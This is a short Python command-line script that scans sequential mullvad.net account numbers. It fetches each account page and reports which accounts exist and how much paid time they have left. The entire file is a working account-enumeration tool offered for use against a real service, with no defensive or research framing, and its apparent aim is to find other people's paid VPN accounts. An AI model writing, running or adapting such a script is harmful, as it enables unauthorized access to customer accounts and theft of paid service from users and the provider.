import requests, click, sys
try: 
    from BeautifulSoup import BeautifulSoup
except ImportError:
    from bs4 import BeautifulSoup

@click.command()
@click.option('-n', type=int, required=True, help='Number of accounts to scan.')
@click.option('-s', default=1, help='Start number.')
#@click.option('-f', default=False, help='Stop at first account with time left.')
def scraper(n, s):
	"""Script to scan for mullvad.net accounts. Interrupt at any time to display current progress and exit."""
	with click.progressbar(range(n), label='Checking accounts %s to %s' % (s, s+n)) as bar:
		global accounts
		accounts = []
		for x in bar:
			if checkPage(s+x) != False:
				accounts.append((s+x, checkPage(s+x)))
	for account in accounts:
		if 'day' in account[1]:
			click.secho('Account %s has %s left.' % (account[0], account[1]), fg='green')
		else:
			click.secho('Account %s exists but has no time left.' % account[0], fg='yellow')

def checkPage(s): #If account exists return time left, if not return False
	r = requests.get('https://mullvad.net/en/account/%s' % s)
	parsed_html = BeautifulSoup(r.text)
	time = parsed_html.find('p', attrs={'class':'size-medium-large brand-color1'}).text.split(':')[2]
	if time != "Not logged in":
		return time
	else:
		return False

if __name__ == '__main__':
	try:
		scraper(standalone_mode=False)
	except (EOFError, KeyboardInterrupt):
		raise click.Abort()
	except click.ClickException as e:
		e.show()
		sys.exit(e.exit_code)
	except click.Abort:
		global accounts
		for account in accounts:
			if 'day' in account[1]:
				click.secho('Account %s has %s left.' % (account[0], account[1]), fg='green')
			else:
				click.secho('Account %s exists but has no time left.' % account[0], fg='yellow')
		sys.exit(1)